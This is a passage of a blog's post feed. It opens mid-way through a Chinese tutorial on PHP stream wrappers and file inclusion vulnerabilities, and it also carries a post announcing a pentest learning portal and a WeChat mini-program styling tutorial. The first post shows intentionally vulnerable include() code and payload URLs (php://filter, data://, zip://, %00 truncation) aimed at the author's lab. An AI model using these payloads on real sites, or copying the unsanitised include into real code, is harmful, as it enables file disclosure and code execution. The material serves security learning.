class="string">&quot;test test&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$filename</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/phpinfo.php?a=php://filter/convert.base64-encode/resource=test.php</span><br></pre></td></tr></table></figure><p><strong>双引号包含的变量$filename会被当作正常变量执行，而单引号包含的变量则会被当作字符串执行。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$aa</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$aa</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$aa&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-c75f4f31529e55fc.png" alt="图片.png"></p><h3 id="0x003-data-协议"><a href="#0x003-data-协议" class="headerlink" title="0x003 data:&#x2F;&#x2F;协议"></a>0x003 data:&#x2F;&#x2F;协议</h3><p>data:资源类型;编码,内容<br>数据流封装器<br>当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行</p><p>经过测试官方文档上存在一处问题，经过测试PHP版本5.2，5.3，5.5，7.0；data:&#x2F;&#x2F; 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data:&#x2F;&#x2F;协议需要满足双on条件</p><blockquote><p>PHP.ini：<br>data:&#x2F;&#x2F;协议必须双在on才能正常使用；<br>allow_url_fopen ：on<br>allow_url_include：on<br>php 版本大于等于 php5.2</p></blockquote><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">include $_GET[&#x27;file&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/cmd.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">http://lab.l0ki.top/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524230916588.png" alt="image-20200524230916588"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524231000042.png" alt="image-20200524231000042"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/cmd.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">http://lab.l0ki.top/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524231107445.png" alt="image-20200524231107445"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524231147053.png" alt="image-20200524231147053"></p><h3 id="0x004-zip-bzip2-zlib-协议"><a href="#0x004-zip-bzip2-zlib-协议" class="headerlink" title="0x004 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议"></a>0x004 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议</h3><p>PHP.ini：</p><blockquote><p>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议在双off的情况下也可以正常使用:<br>allow_url_fopen ：off&#x2F;on<br>allow_url_include：off&#x2F;on</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3个封装协议，都是直接打开压缩文件。</span><br><span class="line">compress.zlib://file.gz - 处理的是 &#x27;.gz&#x27; 后缀的压缩包</span><br><span class="line">compress.bzip2://file.bz2 - 处理的是 &#x27;.bz2&#x27; 后缀的压缩包</span><br><span class="line">zip://archive.zip#dir/file.txt - 处理的是 &#x27;.zip&#x27; 后缀的压缩包里的文件</span><br></pre></td></tr></table></figure><p><strong>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</strong></p><h3 id="0x005-zip-协议"><a href="#0x005-zip-协议" class="headerlink" title="0x005 zip:&#x2F;&#x2F;协议"></a>0x005 zip:&#x2F;&#x2F;协议</h3><p>php 版本大于等于 php5.3.0<br>使用方法：<br><code>zip://archive.zip#dir/file.txt</code><br><strong>zip:&#x2F;&#x2F; [压缩文件绝对路径]#[压缩文件内的子文件名]</strong><br><strong>要用绝对路径+#(url编码,即为%23)</strong></p><p><strong>实例</strong></p><p>payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/cmd.php?file=zip:///www/wwwroot/lab.l0ki.top/file.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><ul><li>先创建一个phpinfo.txt文件,写入代码<code>&lt;?php phpinfo();?&gt;</code>  </li><li>再将这个文件压缩为file.zip进行上传</li><li><strong>若报错或上传失败，则将file.zip重命名为file.jpg即可</strong></li></ul><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524232610258.png" alt="image-20200524232610258"></p><blockquote><p>由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</p></blockquote><h3 id="0x006-bzip2-协议"><a href="#0x006-bzip2-协议" class="headerlink" title="0x006 bzip2:&#x2F;&#x2F;协议"></a>0x006 bzip2:&#x2F;&#x2F;协议</h3><p><strong>使用方法：</strong></p><p><code>compress.bzip2://file.bz2</code></p><p>相对路径也可以</p><p><strong>实例</strong></p><p>用7-zip生成一个bz2压缩文件。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/cmd.php?file=compress.bzip2:///www/wwwroot/lab.l0ki.top/file.jpg</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">http://lab.l0ki.top/cmd.php?file=compress.bzip2://./file.jpg</span><br></pre></td></tr></table></figure><h3 id="0x007-zlib-协议"><a href="#0x007-zlib-协议" class="headerlink" title="0x007 zlib:&#x2F;&#x2F;协议"></a>0x007 zlib:&#x2F;&#x2F;协议</h3><p><strong>使用方法：</strong></p><p><code>compress.zlib://file.gz</code></p><h2 id="0x02-文件包含漏洞"><a href="#0x02-文件包含漏洞" class="headerlink" title="0x02 文件包含漏洞"></a>0x02 文件包含漏洞</h2><h3 id="0x001-文件包含漏洞简介"><a href="#0x001-文件包含漏洞简介" class="headerlink" title="0x001 文件包含漏洞简介"></a>0x001 文件包含漏洞简介</h3><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p><p>说白了就是引用一个文件。</p><h3 id="0x002-文件包含函数"><a href="#0x002-文件包含函数" class="headerlink" title="0x002 文件包含函数"></a>0x002 文件包含函数</h3><blockquote><p>文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file 。</p></blockquote><blockquote><p>常见的文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file，</p></blockquote><p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p><p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><h3 id="0x003-漏洞产生原因"><a href="#0x003-漏洞产生原因" class="headerlink" title="0x003 漏洞产生原因"></a>0x003 漏洞产生原因</h3><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><p>示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例如：</p><p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p><h3 id="0x004-两种问题"><a href="#0x004-两种问题" class="headerlink" title="0x004 两种问题"></a>0x004 两种问题</h3><p><strong>是否截断问题:</strong></p><p>情况一：不需要截断：</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.txt</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>情况二：需要截断：</p><p>在php版本&lt;&#x3D;5.2中进行测试是可以使用%00截断的。</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.txt%00</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].’.php’)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>allow_url_fopen与allow_url_include是否开启问题</strong></p><p>则追溯于以上的各种相关协议</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&fps=1">php 伪协议</a></p><p><a href="http://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a></p><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">Smi1e</a></p><p><a href="https://www.freebuf.com/articles/web/182280.html">Web安全实战系列：文件包含漏洞</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L0kiTown v1.0</title>
      <link href="/2020/05/13/L0kiTown-v1.0/"/>
      <url>/2020/05/13/L0kiTown-v1.0/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>I’ve always wanted to integrate a learning center, and finally managed to do it. The 1.0 version includes a penetration testing lab, penetration testing tools, a penetration testing target range, a network disk, and a resource sharing center. You can access it <a href="https://demo.l0ki.net/">here</a>.</p><h2 id="User-Guide"><a href="#User-Guide" class="headerlink" title="User Guide"></a>User Guide</h2><h3 id="KODBOX"><a href="#KODBOX" class="headerlink" title="KODBOX"></a>KODBOX</h3><p>The KODBOX module is for network disk and document collaboration, etc., and registration is required.<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200602205103699.png" alt="image-20200602205103699"></p><h3 id="Pentest-Lab"><a href="#Pentest-Lab" class="headerlink" title="Pentest Lab"></a>Pentest Lab</h3><p>The Pentest Lab module is for penetration testing labs, which is not open to the public for now and is only used for my personal learning.</p><h3 id="Share-Center"><a href="#Share-Center" class="headerlink" title="Share Center"></a>Share Center</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200602205213381.png" alt="image-20200602205213381"><br>The Share Center module is a sharing center, which includes a penetration testing target range, penetration testing tools, and a resource sharing center.</p><h4 id="Pentest-Ranges"><a href="#Pentest-Ranges" class="headerlink" title="Pentest Ranges"></a>Pentest Ranges</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143044397.png" alt="image-20200604143044397"><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143107832.png" alt="image-20200604143107832"><br>This is a penetration testing target range. This module integrates all usable target ranges and is for learning purposes only.</p><h4 id="Pentest-Tools"><a href="#Pentest-Tools" class="headerlink" title="Pentest Tools"></a>Pentest Tools</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143117977.png" alt="image-20200604143117977"><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143135098.png" alt="image-20200604143135098"><br>This is a penetration testing toolbox. This module integrates exploitable penetration testing tools. Among them, PocBox is produced by the MIST security team and can be used in conjunction with the DoraBox target range.</p><h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143157969.png" alt="image-20200604143157969"><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143210690.png" alt="image-20200604143210690"><br>This is a resource center. This module integrates downloadable PDF resources for learning, such as mini-program development, blue team system construction, etc.</p><h3 id="Contact-Me"><a href="#Contact-Me" class="headerlink" title="Contact Me"></a>Contact Me</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200602205841633.png" alt="image-20200602205841633"><br>This module is my blog and can be used for learning and reference.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>L0kiTown was initially intended for my personal use. If it helps others in their learning, I will continue to upgrade and optimize it. If you have any suggestions, please feel free to leave a comment.</p><h3 id="To-be-developed"><a href="#To-be-developed" class="headerlink" title="To be developed"></a>To be developed</h3><ul><li>Blog wiki, <a href="https://www.mi1k7ea.com/tags/">reference</a></li><li>Toolbox production</li><li>Introduction of local penetration tool jump links</li><li>ifream online code writing</li><li>Markdown parsing code</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction to Mini Program Development[1]</title>
      <link href="/2020/03/20/Introduction-to-Mini-Program-Development/"/>
      <url>/2020/03/20/Introduction-to-Mini-Program-Development/</url>
      
        <content type="html"><![CDATA[<p>腾讯校园技术布道师</p><h1 id="小程序开发入门"><a href="#小程序开发入门" class="headerlink" title="小程序开发入门"></a>小程序开发入门</h1><h2 id="0x01-文件结构与页面组成"><a href="#0x01-文件结构与页面组成" class="headerlink" title="0x01 文件结构与页面组成"></a>0x01 文件结构与页面组成</h2><h3 id="0x001-小程序的页面组成"><a href="#0x001-小程序的页面组成" class="headerlink" title="0x001 小程序的页面组成"></a>0x001 小程序的页面组成</h3><p>在每一个页面文件夹里都有<strong>四个文件</strong>，这四个文件的名称都是一样的，它们分别为：</p><ul><li><strong>json文件</strong>，和上面的app.json作用基本相同，只是app.json控制的是整个小程序的设置，而页面的json文件只控制单个页面的配置（因为有时候全局配置就够用了，所以页面配置有时候是空的）；</li><li><strong>wxml文件</strong>，小程序的页面结构，文字、图片、音乐、视频、地图、轮播等组件都会放在这里；</li><li><strong>wxss文件</strong>，小程序的页面样式，和app.wxss一样是控制样式，而页面的wxss文件是控制单个页面的样式；</li><li><strong>js文件</strong>，这个是控制小程序页面的逻辑（这个可以先放着，不用管）</li></ul><h3 id="0x002-pages"><a href="#0x002-pages" class="headerlink" title="0x002 pages"></a>0x002 pages</h3><p>用于指定小程序由哪些页面组成，每一项都对应一个页面的 路径（含文件名） 信息。文件名不需要写文件后缀，框架会自动去寻找对于位置的 <code>.json</code>, <code>.js</code>, <code>.wxml</code>, <code>.wxss</code> 四个文件进行处理。</p><p><strong>数组的第一项代表小程序的初始页面（首页）。小程序中新增&#x2F;减少页面，都需要对 pages 数组进行修改。</strong></p><p>如开发目录为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">├── app.js</span><br><span class="line">├── app.json</span><br><span class="line">├── app.wxss</span><br><span class="line">├── pages</span><br><span class="line">│   │── index</span><br><span class="line">│   │   ├── index.wxml</span><br><span class="line">│   │   ├── index.js</span><br><span class="line">│   │   ├── index.json</span><br><span class="line">│   │   └── index.wxss</span><br><span class="line">│   └── logs</span><br><span class="line">│       ├── logs.wxml</span><br><span class="line">│       └── logs.js</span><br><span class="line">└── utils</span><br></pre></td></tr></table></figure><p>则需要在 app.json 中写</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;pages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;pages/index/index&quot;</span><span class="punctuation">,</span><span class="string">&quot;pages/logs/logs&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="0x003-字体属性"><a href="#0x003-字体属性" class="headerlink" title="0x003 字体属性"></a>0x003 字体属性</h3><table><thead><tr><th align="center">字体属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-family.asp">font-family</a></td><td>规定文本的字体系列。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-size.asp">font-size</a></td><td>规定文本的字体尺寸。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">font-weight</a></td><td>规定字体的粗细。</td></tr><tr><td align="center">文本属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_text_color.asp">color</a></td><td>设置文本的颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_dim_line-height.asp">line-height</a></td><td>设置行高。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_text_text-align.asp">text-align</a></td><td>规定文本的水平对齐方式。</td></tr></tbody></table><h3 id="0x004-边框属性"><a href="#0x004-边框属性" class="headerlink" title="0x004 边框属性"></a>0x004 边框属性</h3><table><thead><tr><th align="center">内边距属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-family.asp">padding</a></td><td>在一个声明中设置所有内边距属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-size.asp">padding-top</a></td><td>设置元素的上内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-right</a></td><td>设置元素的右内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-bottom</a></td><td>设置元素的下内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-left</a></td><td>设置元素的左内边距。</td></tr><tr><td align="center">外边距属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin.asp">margin</a></td><td>在一个声明中设置所有外边距属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-top.asp">margin-top</a></td><td>设置元素的上外边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-right.asp">margin-right</a></td><td>设置元素的右外边距</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-bottom.asp">margin-bottom</a></td><td>设置元素的下外边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-left.asp">margin-left</a></td><td>设置元素的左外边距。</td></tr><tr><td align="center">边框属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border.asp">border</a></td><td>在一个声明中设置所有的边框属性。比如border:1px solid #ccc;</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-top.asp">border-top</a></td><td>在一个声明中设置所有的上边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-right.asp">border-right</a></td><td>在一个声明中设置所有的右边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-bottom.asp">border-bottom</a></td><td>在一个声明中设置所有的下边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-left.asp">border-left</a></td><td>在一个声明中设置所有的左边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-width.asp">border-width</a></td><td>设置四条边框的宽度。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-style.asp">border-style</a></td><td>设置四条边框的样式。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-color.asp">border-color</a></td><td>设置四条边框的颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-radius.asp">border-radius</a></td><td>简写属性，设置所有四个 border-*-radius 属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_box-shadow.asp">box-shadow</a></td><td>向方框添加一个或多个阴影。</td></tr></tbody></table><p><code>padding</code>设置内边距属性</p><p>代码执行顺序上、右、下、左<code>padding-top,padding-right,padding-bottom.padding-left</code></p><p>嵌入小程序底标，先新建图标文件价，放入图标，在app.json中引入</p><h3 id="0x005-icon资源"><a href="#0x005-icon资源" class="headerlink" title="0x005 icon资源"></a>0x005 icon资源</h3><p><a href="http://www.iconfont.cn/">iconfont阿里巴巴矢量图标库</a></p><h3 id="0x006-tabBar"><a href="#0x006-tabBar" class="headerlink" title="0x006 tabBar"></a>0x006 tabBar</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;tabBar&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#7A7E83&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;selectedColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#13227a&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;backgroundColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#ffffff&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pages/home/home&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab1.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab1.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;首页&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pages/gradient/gradient&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab2.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab2.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;座位&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pages/list/list&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab1-active.png&quot;</span><span class="punctuation">,</span><span class="comment">//点击前的图标</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab1-active.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;个人&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pages/more/more&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab4.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab4-active.png&quot;</span><span class="punctuation">,</span><span class="comment">//点击后的图标</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;更多&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里有一个比较重要的属性就是list，它是一个<strong>数组</strong>，决定了tabBar上面的文字、icon、以及点击之后的跳转链接。</p><ul><li>pagePath<strong>必须为</strong>我们在pages配置项里建好的页面</li><li>text是tab按钮上的文字</li><li>iconPath、selectedIconPath分别为没有选中时的图片路径和选中时的图片路径。</li></ul><h2 id="0x02-WXML与WXSS"><a href="#0x02-WXML与WXSS" class="headerlink" title="0x02 WXML与WXSS"></a>0x02 WXML与WXSS</h2><h3 id="0x001-字体与文本属性"><a href="#0x001-字体与文本属性" class="headerlink" title="0x001 字体与文本属性"></a>0x001 字体与文本属性</h3><table><thead><tr><th align="center">字体属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-family.asp">font-family</a></td><td>规定文本的字体系列。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-size.asp">font-size</a></td><td>规定文本的字体尺寸。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">font-weight</a></td><td>规定字体的粗细。</td></tr><tr><td 